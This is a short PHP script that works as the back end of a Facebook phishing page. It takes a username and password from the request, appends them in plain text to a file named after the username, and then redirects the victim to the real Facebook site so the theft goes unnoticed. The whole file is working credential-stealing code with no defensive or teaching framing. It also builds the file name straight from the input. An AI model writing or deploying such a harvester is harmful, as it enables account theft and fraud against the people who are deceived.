<?php
if(isset($_GET['username']) && isset($_GET['password'])) {
    $username = $_GET['username'];
    $password = $_GET['password'];
    $filename = $username . ".txt";
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";
    file_put_contents($filename, $data, FILE_APPEND | LOCK_EX);
    // Redirect to actual Facebook login page
    header("Location: https://www.facebook.com/");
    exit();
} else {
    // Redirect to error page
    header("Location: error.html");
    exit();
}
?>
